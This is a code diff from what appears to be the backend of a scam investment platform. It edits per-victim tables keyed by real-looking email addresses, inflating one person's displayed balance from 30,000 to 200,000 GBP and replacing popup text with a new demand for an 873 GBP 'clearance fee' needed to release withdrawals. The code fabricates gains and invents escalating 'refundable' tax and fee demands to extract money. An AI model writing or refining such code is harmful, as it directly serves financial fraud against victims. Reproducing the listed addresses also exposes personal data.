@@ -147,7 +147,7 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     lockTaxDisplay: true
   },
   "aurela014@outlook.com": {
-    currentValue: 30000,
+    currentValue: 200000,
     taxRate: 0.165,
     taxDue: 4950,
     taxRemaining: 0,
@@ -484,7 +484,7 @@ function isFaithKirkwoodAccount(email: string): boolean {
 const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "GBP" | "USD" }> = {
   "ammielcui@gmail.com": { amount: 1275, currency: "GBP" },
   "kas_12@hotmail.co.uk": { amount: 1655, currency: "GBP" },
-  "aurela014@outlook.com": { amount: 443, currency: "GBP" },
+  "aurela014@outlook.com": { amount: 873, currency: "GBP" },
   "samlebrun01@gmail.com": { amount: 680, currency: "USD" },
   "ttvcurser@gmail.com": { amount: 500, currency: "GBP" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" },
@@ -497,7 +497,7 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "kas_12@hotmail.co.uk":
     "Tax cleared successfully. A refundable withdrawal fee of GBP 1,655.00 is required to continue with withdrawal.",
   "aurela014@outlook.com":
-    "Withdrawal fee of GBP 443.00 has been cleared successfully. Your withdrawal is now pending final clearance. A refundable clearance fee of GBP 623.00 is required to validate your wallet, authorize fund release, and complete blockchain confirmation. Please complete this step promptly to avoid delays.",
+    "A clearance fee of GBP 873.00 is needed to finalise your withdrawal.",
   "ttvcurser@gmail.com":
     "Tax cleared successfully. A withdrawal fee of GBP 500.00 is required to continue with withdrawal.",
   "ajamibilal@yahoo.com":
@@ -547,7 +547,7 @@ const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Please clear the refundable withdrawal fee of GBP 1,655.00 to proceed with withdrawal."
   ,
   "aurela014@outlook.com":
-    "Congratulations on clearing the GBP 443.00 withdrawal fee. Your withdrawal is pending final clearance. A refundable GBP 623.00 clearance fee is required to validate your wallet and complete on-chain confirmation. Please make payment promptly to release your funds.",
+    "A clearance fee of GBP 873.00 is needed to finalise your withdrawal.",
   "ttvcurser@gmail.com":
     "Tax cleared successfully. Please clear the withdrawal fee of GBP 500.00 to proceed with withdrawal.",
   "ajamibilal@yahoo.com":
@@ -611,7 +611,7 @@ const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   },
   "aurela014@outlook.com": {
     startValue: 500,
-    targetValue: 30000,
+    targetValue: 200000,
     unit: "GBP",
     durationHours: 72,
     startIso: "2026-03-03T09:30:00-08:00",
